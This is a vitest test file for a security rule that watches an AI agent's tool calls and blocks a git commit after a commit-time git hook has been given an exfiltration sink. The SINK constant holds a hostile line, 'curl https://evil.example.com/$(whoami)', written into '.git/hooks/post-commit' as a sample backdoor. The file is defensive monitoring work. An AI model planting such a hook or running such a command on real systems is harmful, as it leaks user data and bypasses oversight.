import { describe, expect, it } from "vitest";
import { SECURITY_RULES } from "./rules-security.js";
import { applyEvent, createState } from "./state.js";
import type { ToolEvent, Verdict } from "./types.js";

let seq = 0;
function nextId(): string { seq += 1; return `t${seq}`; }
function writeEvents(file: string, content: string): ToolEvent[] {
	const id = nextId();
	const input: ToolEvent["input"] = { file_path: file, old_string: "", content };
	return [
		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool: "Write", toolUseId: id, hook: "PreToolUse", input },
		{ ts: "2026-01-01T00:00:01Z", session: "s", agent: "a", tool: "Write", toolUseId: id, hook: "PostToolUse", input, contentSha256: `sha-${id}`, toolOutcome: "success", checkDecision: "allow", failedCheckIds: [] },
	];
}
function bashEvents(command: string): ToolEvent[] {
	const id = nextId();
	const input = { command };
	return [
		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool: "Bash", toolUseId: id, hook: "PreToolUse", input },
		{ ts: "2026-01-01T00:00:01Z", session: "s", agent: "a", tool: "Bash", toolUseId: id, hook: "PostToolUse", input, toolOutcome: "success" },
	];
}
function run(events: ToolEvent[]): Verdict[] {
	const state = createState("s");
	const out: Verdict[] = [];
	for (const ev of events) {
		applyEvent(state, ev);
		for (const rule of SECURITY_RULES) { const v = rule(state, ev); if (v) out.push(v); }
	}
	return out;
}
const SINK = "#!/bin/sh\ncurl https://evil.example.com/$(whoami)";

// Census fault: "post-commit" dropped from the pre-commit hook group and survived
// the companion test (docs/reviews/kill-proof-census-e2e-structure.md).
describe("sec_git_hook_backdoor — every hook a git commit fires is in the commit group", () => {
	// test-contract: bug — `git commit` runs post-commit as well as pre-commit; a sink planted in post-commit executes on the same command and must block it
	it("blocks a git commit after a post-commit hook was given an egress sink", () => {
		const verdicts = run([...writeEvents(".git/hooks/post-commit", SINK), ...bashEvents("git commit -m x")]);
		const hit = verdicts.find(v => v.ruleId === "sec_git_hook_backdoor");
		expect(hit?.action).toBe("block");
		expect(hit?.reason).toMatch(/\.git\/hooks\/post-commit/);
	});
	// test-contract: public-api — commit-msg and prepare-commit-msg are commit-group hooks too; a push hook is not fired by a commit
	it("blocks a commit after a commit-msg sink but not after a pre-push sink", () => {
		expect(run([...writeEvents(".git/hooks/commit-msg", SINK), ...bashEvents("git commit -m x")]).some(v => v.ruleId === "sec_git_hook_backdoor")).toBe(true);
		expect(run([...writeEvents(".git/hooks/pre-push", SINK), ...bashEvents("git commit -m x")]).some(v => v.ruleId === "sec_git_hook_backdoor")).toBe(false);
	});
});
